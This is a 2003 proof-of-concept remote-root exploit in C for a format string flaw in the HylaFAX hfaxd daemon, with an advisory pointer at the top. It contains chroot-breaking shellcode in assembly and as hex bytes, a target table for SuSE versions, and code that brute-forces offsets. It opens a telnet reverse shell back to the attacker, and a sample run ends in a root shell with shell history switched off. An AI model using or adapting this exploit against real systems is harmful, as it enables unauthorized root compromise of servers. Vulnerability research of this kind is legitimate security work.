// source: https://www.securityfocus.com/bid/9005/info

Hylafax hfaxd (daemon) has been reported prone to an unspecified format string vulnerability that may be exploited under non-standard configurations to execute arbitrary instructions remotely as the root user.

/*** Hylafax remote root PoC exploit
     (C) 2003 Sebastian Krahmer  <krahmer@cs.uni-potsdam.de>

        *** FOR EDUCATIONAL PURPOSES ONLY ****

The phrack 59 (www.phrack.org !) article about format strings
on the heap helped a lot. Thanks to gera, fozzy and juliano
for hints.


How to get the right n$ values from syslog:

Sep 29 05:16:22 linux HylaFAX[2704]: command: site trigger %350$x
Sep 29 05:16:22 linux HylaFAX[2704]: ??? bfffff24

So, %350$n is a good choice since a write would located on valid stack.

Sep 29 05:05:24 linux HylaFAX[2644]: command: site trigger %959$x
Sep 29 05:05:24 linux HylaFAX[2644]: ??? 4f464e49

At 0xbffff24 you find the value 0x4f464e49 via gdb, and
brute forcing %1$x to %1000$x shows that at %959$x (see syslog
output above) the value of the 0xbffff24 pointer can be found.
Thus we first write the GOT address we want to modify to 0xbffff24
via the %350$n and then using the value of *0xbffff24 (which is the
address of the GOT entry we want to modify) as a pointer again to
finally write the GOT entry.

strace -i -e raw=read -etrace=read  -f -p 3293 2>&1

[pid  3313] [402ec328] read(0, 0x808c6b8, 0x400) = 0x400
                               ^^^^^^^^^ network input buffer

[pid  3313] [402ec328] read(0, 0x808c6b8, 0x400) = 0x9

(gdb) x/100x 0x808c6b8
...
0x808c6f8:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c708:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c718:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c728:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c738:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c748:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c758:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c768:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c778:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c788:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c798:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c7a8:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c7b8:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x808c7c8:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
...

0x804c1f0 <fprintf>:    jmp    *0x80835e0
(gdb) x/i 0x804c1f0

Thus, some value like 0x808c6b8 should be written to the address 0x80835e0.
This gives the format strings:

 site trigger %%134755804d%%350$n\n"
                ^^^^^^^^^ This is the GOT entry minus 4 (0x80835e0-4)

 site trigger %%%ud%%%d$n\n",
                 ^^ here the address of the buffer holding the shellcode
                    is palced i.e. 0x808c780. This is variable in the
                    target struct.


The 0th target (-t 0) is a debug target which makes hfaxd sending all
the fine stuff to syslogd. Then you can look which n$ are usable.

Now for the shellcode: we need a chroot breakign one. It mounts proc
to the chroot cage, modifies modprobe path via it and triggers a
modprobe call by kernel via an invalid ELF file. The called
"modprobe" is indeed a back-connecting shellscript. Outta.


<--- shellcode -->
; nasm -f elf code.s

GLOBAL cbegin
GLOBAL cend

cbegin:
	xor eax, eax
	mov al, 23
	xor ebx, ebx
	int 0x80		; setuid(0)

	jmp short proc1

; mount proc FS

mountit:
	pop ebx
	xor ecx, ecx
	mov [ebx+4], cl		; terminate string with \0
	xor eax, eax
	mov al, 39
	xor ecx, ecx
	mov cx, 0x1ff
	int 0x80		; mkdir("proc", 0755);

	mov ecx, ebx
	mov edx, ebx
	xor esi, esi
	xor edi, edi
	xor eax, eax
	mov al, 21		; mount("proc", "proc", "proc", 0, NULL)
	int 0x80

	jmp short pshell1

; open connect shell script
op:
	pop ebx
	xor eax, eax
	mov [ebx+1], al		; terminate string with \0
	mov al, 8
	xor ecx, ecx
	mov cx, 0x1ff
	int 0x80		; creat("p", 0777);


	jmp short connect1

proc1:
	jmp short proc
; write it
wp:
	pop ecx
	mov ebx, eax
	dec byte [ecx+9]	; create a '\n'
	mov al, 4
	xor edx, edx
	mov dl, 68
	int 0x80		; write("#!/bin/sh...", 68)

	mov al, 6
	int 0x80		; close

	jmp short elfp

; open weird ELF file to trigger modprobe
oelf:
	pop ebx
	xor eax, eax
	mov [ebx+3], al		; terminate string with \0
	mov al, 8
	xor ecx, ecx
	mov cx, 0x1ff
	int 0x80		; creat("elf", 0777);

	jmp short elfh		;

; write weird ELF
welf:	pop ecx
	mov ebx, eax		; fd to ebx
	xor edx, edx
	mov dl, 20
	mov al, 4
	int 0x80		; write()

	mov al, 6
	int 0x80		; close weird ELF

	jmp short modp

pshell1:
	jmp short pshell

om:
	pop ebx
	xor eax, eax
	mov al, 5
	xor ecx, ecx
	mov [ebx+24], cl
	inc cl
	int 0x80		; open("...modprobe", 1)

	jmp short mpath

wm:
	pop ecx
	mov ebx, eax		; fd to ebx
	mov al, 4
	xor edx, edx
	mov dl, 16
	int 0x80		; write(fd, "/var/spool/fax/p", 16)

	mov al, 6
	int 0x80		; close


	mov al, 11
	xor ecx, ecx

	jmp short elfp2

connect1:
	jmp short connect

exec:
	pop ebx
	mov [ebx+3], cl
	push ecx
	push ebx
	mov ecx, esp
	xor edx, edx
	int 0x80		; execve("elf",...)


proc:
	call mountit
	db "proc."

elfp:				; ELF path
	call oelf
	db "elf."

elfh:				; ELF header triggering modprobe
	call welf
	db 0x45, 0x7f, 0x46, 0x4c, 0x01, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1
	db 0x1, 0x1, 0x1, 0x1, 0x1, 0x2, 0x22, 0x22

mpath:
	call wm
	db "/var/spool/fax/p"

pshell:
	call op
	db "p."

modp:
	call om
	db "proc/sys/kernel/modprobe."

elfp2:
	call exec
	db "elf."

connect:
	call wp
	db "#!/bin/sh",0xb
;	db "telnet 127.000.000.001 3128|sh|telnet 127.000.000.001 8080"
cend:

<-- shellcode -->


$ ./a.out -h 127.0.0.1 -t 1 -b 192.168.0.1

>>> Hylafax exploit <<<

> Attempting to exploit hylafax-4.1.5-43 on 127.0.0.1:(4559)

site trigger %134755804d%350$n
site trigger %134793088d%967$n

.....
Connected!
Trying 192.168.000.001...
Connected to 192.168.000.001.
Escape character is '^]'.
Linux linux 2.4.20-4GB #1 Mon Mar 17 17:54:44 UTC 2003 i686 unknown unknown GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
 12:29:38 up  9:07,  6 users,  load average: 2.25, 2.10, 2.23
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
stealth  tty2      03:23   48:24   0.73s  0.05s /usr/X11R6/bin/xinit4
stealth  pts/2     11:42    1:41   0.61s  1.06s xterm
stealth  pts/1     11:42    1.00s  4.50s  0.01s ./a.out -h 127.0.0.1 -t 1 -b 19
stealth  pts/3     11:42    6.00s  0.66s  3.08s xterm
stealth  pts/4     12:24    2:52   0.27s  0.30s xterm

In order to work, the config need a debug level of at least 2:

ServerTracing:          0x002

in hfaxd.conf.

***/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/time.h>



/* Shellcodes.
 */
unsigned char x86_sigtrap[] =
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
	"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc";


unsigned char x86_lnx_create_blub[] =
	"\x31\xc0\xb0\x17\x31\xdb\xcd\x80"
	"\x31\xc0\xb0\x08\xeb\x0e\x5b\x31\xc9\x88\x4b\x04"
	"\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xed\xff\xff"
	"\xff\x62\x6c\x75\x62\x31\xc0\x40\xcd\x80";



unsigned char x86_lnx_proc_chroot_backconnect[] =
	"\x31\xc0\xb0\x17\x31\xdb\xcd\x80\xeb\x34\x5b\x31"
	"\xc9\x88\x4b\x04\x31\xc0\xb0\x27\x31\xc9\x66\xb9"
	"\xff\x01\xcd\x80\x89\xd9\x89\xda\x31\xf6\x31\xff"
	"\x31\xc0\xb0\x15\xcd\x80\xeb\x4b\x5b\x31\xc0\x88"
	"\x43\x01\xb0\x08\x31\xc9\x66\xb9\xff\x01\xcd\x80"
	"\xeb\x60\xeb\x6c\x59\x89\xc3\xfe\x49\x09\xb0\x04"
	"\x31\xd2\xb2\x44\xcd\x80\xb0\x06\xcd\x80\xeb\x62"
	"\x5b\x31\xc0\x88\x43\x03\xb0\x08\x31\xc9\x66\xb9"
	"\xff\x01\xcd\x80\xeb\x59\x59\x89\xc3\x31\xd2\xb2"
	"\x14\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xeb\x7d\xeb"
	"\x74\x5b\x31\xc0\xb0\x05\x31\xc9\x88\x4b\x18\xfe"
	"\xc1\xcd\x80\xeb\x4f\x59\x89\xc3\xb0\x04\x31\xd2"
	"\xb2\x10\xcd\x80\xb0\x06\xcd\x80\xb0\x0b\x31\xc9"
	"\xeb\x74\xeb\x7b\x5b\x88\x4b\x03\x51\x53\x89\xe1"
	"\x31\xd2\xcd\x80\xe8\x59\xff\xff\xff\x70\x72\x6f"
	"\x63\x2e\xe8\x99\xff\xff\xff\x65\x6c\x66\x2e\xe8"
	"\xa2\xff\xff\xff\x45\x7f\x46\x4c\x01\x01\x01\x01"
	"\x01\x01\x01\x01\x01\x01\x01\x01\x01\x02\x22\x22"
	"\xe8\xac\xff\xff\xff\x2f\x76\x61\x72\x2f\x73\x70"
	"\x6f\x6f\x6c\x2f\x66\x61\x78\x2f\x70\xe8\x3a\xff"
	"\xff\xff\x70\x2e\xe8\x80\xff\xff\xff\x70\x72\x6f"
	"\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c"
	"\x2f\x6d\x6f\x64\x70\x72\x6f\x62\x65\x2e\xe8\x89"
	"\xff\xff\xff\x65\x6c\x66\x2e\xe8\x20\xff\xff\xff"
	"\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68\x0b";


unsigned char back_ip[128];

struct {
	char *dist, *package, *fmt, *code;
	u_int16_t n1, n2;
	u_int32_t nbuf;
} targets[] = {
	{ "debug", "debug", "debug", "debug", 0, 1, 0
	},
	{ "SuSE Linux 8.2",
	  "hylafax-4.1.5-43",
	  "site trigger %%134755804d%%350$n\n"
	  "site trigger %%%ud%%%d$n\n", // 350->bfffff24, 963->4f464e49
	  x86_lnx_proc_chroot_backconnect,
	  950, 999,	/* start/stop values for bruteforcing 2nd n$ */
	  0x808c780
	},
	{ "SuSE Linux 8.1",
	  "hylafax-4.1.3-32",
	  "site trigger %%134748344d%%334$n\n"//0x804c1d4, *0x80818bc
	  "site trigger %%%ud%%%d$n\n", // 334->bfffff24, 947->4f464e49
	  x86_lnx_proc_chroot_backconnect,
	  940, 999,
	  0x808aa00
	}

};

int verbose = 0;

int list_targets()
{
	int i;
	for (i = 0; i < sizeof(targets)/sizeof(targets[0]); ++i) {
		printf("\n%d: %s / %s\n", i, targets[i].dist, targets[i].package);
	}
	return 0;
}


void die(const char *s)
{
	perror(s);
	exit(errno);
}


int writen(int fd, const void *buf, size_t len)
{
	int o = 0, n;

	while (len > 0) {
		if ((n = write(fd, buf+o, len)) < 0)
			return n;
		len -= n;
		o += n;
	}
	return o;
}

/* Simple tcp_connect(). Disables Nagle.
 */
int tcp_connect(const char *host, u_short port)
{
	int sock, one = 1, len = sizeof(one);
	struct hostent *he;
	struct sockaddr_in sin;

	if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0)
		die("sock");

	if ((he = gethostbyname(host)) == NULL) {
		herror("gethostbyname");
		exit(EXIT_FAILURE);
	}

	memset(&sin, 0, sizeof(sin));
	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = port == 0 ? htons(4559):htons(port);

	if (connect(sock, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
		close(sock);
		return -1;
	}
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, len) < 0)
		die("setsockopt");

	return sock;
}


void usage(const char *s)
{
	fprintf(stderr, "\nHylafucks remote hylafax PoC exploit\n\n"
	                "Usage: %s [-u user] [-p pass] <-h host> [-p port] [-v] [-t target] <-b connect IP>\n\n"
	                "\t-u user:\tthe user to login as (default 'foo')\n"
	                "\t-p pass:\tthe password (default 'bar', note: user/pass are not always\n"
	                "\t\t\trequired on all setups\n"
	                "\t-t target:\tspecifies remote package/OS\n"
	                "\t-b IP:\t\tthe IP for the back-connect\n\n"
	                "use -t -1 for a target list. 0 is debug target; 1 is default.\n"
	                "Port 3128 and 8080 are used on local machine for the backconnect.\n\n", s);
	exit(1);
}


void wait4shell(int p)
{
	int	l, s1, s2, a1, a2;
	char	buf[512];
	fd_set	rfds;
	char *cmd = "unset HISTFILE;uname -a;id;w\n";
	struct sockaddr_in p8080, p3128;

	memset(&p8080, 0, sizeof(p8080));
	memset(&p3128, 0, sizeof(p3128));

	/* Open 2 ports: 3128 and 8080 */
	p8080.sin_family = AF_INET;
	p8080.sin_addr.s_addr = INADDR_ANY;
	p8080.sin_port = htons(8080);
	p3128.sin_family = AF_INET;
	p3128.sin_addr.s_addr = INADDR_ANY;
	p3128.sin_port = htons(3128);

	if ((s1 = socket(PF_INET, SOCK_STREAM, 0)) < 0)
		die("wait4shell::socket/1");
	if ((s2 = socket(PF_INET, SOCK_STREAM, 0)) < 0)
		die("wait4shell::socket/2");
	if (bind(s1, (struct sockaddr*)&p3128, sizeof(p3128)) < 0)
		die("wait4shell::bind/1");
	if (bind(s2, (struct sockaddr*)&p8080, sizeof(p8080)) < 0)
		die("wait4shell::bind/2");

	if (listen(s1, 1) < 0)
		die("wait4shell::listen/1");
	if (listen(s2, 1) < 0)
		die("wait4shell::listen/2");

	if ((a1 = accept(s1, NULL, 0)) < 0)
		die("wait4shell::accept/1");
	if ((a2 = accept(s2, NULL, 0)) < 0)
		die("wait4shell::accept/1");

	printf("\nConnected!\n");
	kill(p, SIGKILL);

	if (writen(a1, cmd, strlen(cmd)) < 0)
		die("wait4shell::write");

	while (1) {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(a1, &rfds);
		FD_SET(a2, &rfds);

		select(a2 + 1, &rfds, NULL, NULL, NULL);
		if (FD_ISSET(0, &rfds)) {
			l = read(0, buf, sizeof (buf));
			if (l <= 0)
				die("wait4shell::read");
			writen(a1, buf, l);
		}
		if (FD_ISSET(a2, &rfds)) {
			l = read(a2, buf, sizeof (buf));
			if (l == 0) {
				printf("connection closed by foreign host.\n");
				exit(EXIT_FAILURE);
			} else if (l < 0)
				die("wait4shell::read remote");
			writen(1, buf, l);
		}
	}
}


int expect_reply(int peer, const char *reply, char *buf, size_t blen)
{
	int done = 0, i = 0;

	memset(buf, 0, blen);
	while (!done) {
		if (i >= blen)
			die("Nuts! Too much response.");
		if (read(peer, &buf[i], 1) != 1)
			die("expect_reply::read");
		++i;
		if (buf[i-1] == '\n') {
			if (verbose)
				printf("[\n%s]\n", buf);
			if (strstr(buf, reply) != NULL)
				done = 1;
			else {
				memset(buf, 0, blen);
				i = 0;
			}
		}
	}
	return 0;
}


int send_overflow(char *host, int port, int target, char *user, char *pass)
{
	char buf[1024], *crash = NULL, bip[128];
	unsigned int i = 0;
	int peer = -1, r = 0;
	fd_set rset;
	struct timeval tv;


	for (i = targets[target].n1; i < targets[target].n2; ++i) {
		close(peer);
		peer = tcp_connect(host, port);
		if (peer < 0)
			die("send_overflow::tcp_connect");
		expect_reply(peer, "220", buf, sizeof(buf));

		/* build shellcode with back-connect IP; reserve space first */
		crash = malloc(strlen(targets[target].code) +
		               sizeof("telnet 127.000.000.001 3128|sh|"
 		                      "telnet 127.000.000.001 8080"));
		snprintf(bip, sizeof(bip), "telnet %s 3128|sh|telnet %s 8080",
			back_ip, back_ip);
		sprintf(crash, "%s%s", targets[target].code, bip);

		memset(buf, 0x90, sizeof(buf));

		/* ehm... */
		strcpy(&buf[sizeof(buf)-1]-strlen(crash)-1, crash);
		free(crash);

		buf[sizeof(buf)-1] = '\n';
		if (writen(peer, buf, sizeof(buf)) < 0)
			die("send_overflow::writen/shellcode");
		expect_reply(peer, "500", buf, sizeof(buf));
		expect_reply(peer, "500", buf, sizeof(buf));

		/* USER/PASS epilogue */
		snprintf(buf, sizeof(buf), "user %s\n", user);
		if (writen(peer, buf, strlen(buf)) < 0)
			die("send_overflow::writen/user");
		expect_reply(peer, "\n", buf, sizeof(buf));
		snprintf(buf, sizeof(buf), "pass %s\n", pass);
		if (writen(peer, buf, strlen(buf)) < 0)
			die("writen/pass");
		expect_reply(peer, "\n", buf, sizeof(buf));

		if (strcmp(targets[target].dist, "debug") == 0) {
			read(0,buf,1);
			for (i = 1; i < 1000; ++i) {
				sprintf(buf, "site trigger %%%d$x\n", i);
				writen(peer, buf, strlen(buf));
				usleep(30000);
			}
			break;
		}


		snprintf(buf, sizeof(buf), targets[target].fmt,
		         targets[target].nbuf, i);

		if (writen(peer, buf, strlen(buf)) < 0)
			die("send_overflow::read");
		printf("%s\n", buf);

		while (1) {
			FD_ZERO(&rset);
			FD_SET(peer, &rset);
			tv.tv_sec = 1;
			tv.tv_usec = 0;
			r = select(peer+1, &rset, NULL, NULL, &tv);
			if (!FD_ISSET(peer, &rset)) {
				printf(".");
				continue;
			}

			r = read(peer, buf, sizeof(buf));
			break;
		}
		printf("\n");
	}


	return peer;
}


int main(int argc, char **argv)
{
	int peer = -1, c = 0, target = 1, port = 0,
	    d1 = 0, d2 = 0, d3 = 0, d4 = 0, p = 0;
	char *host = NULL, *back = NULL, *user = "foo", *pass = "bar";


	while ((c = getopt(argc, argv, "h:p:t:vb:u:P:")) != -1) {
		switch (c) {
		case 'h':
			host = strdup(optarg);
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case 't':
			target = atoi(optarg);
			break;
		case 'v':
			verbose = 1;
			break;
		case 'b':
			back = strdup(optarg);
			break;
		case 'u':
			user = strdup(optarg);
			break;
		case 'P':
			pass = strdup(optarg);
			break;
		default:
			usage(argv[0]);
		}
	}

	printf("\n>>> Hylafax exploit <<<\n\n");

	if (target == -1) {
		list_targets();
		return 0;
	}

	if (!host || !back)
		usage(argv[0]);

	if (target >= sizeof(targets)/sizeof(targets[0])) {
		fprintf(stderr, "Invalid target!\n");
		return 1;
	}

	/* normalize IP */
	sscanf(back, "%d.%d.%d.%d", &d1, &d2, &d3, &d4);
	sprintf(back_ip, "%03d.%03d.%03d.%03d", d1, d2, d3, d4);

	if (verbose)
		printf("Normalized back-connect IP: %s\n", back_ip);


	setbuffer(stdout, NULL, 0);

       printf("> Attempting to exploit %s on %s:(%d)\n\n",
		targets[target].package, host, port?port:4459);

	if (target != 0) {
		if ((p = fork()) > 0)
			wait4shell(p);
	}

	peer = send_overflow(host, port, target, user, pass);

	fprintf(stderr, "Failed to exploit '%s'\n", host);
	return 0;
}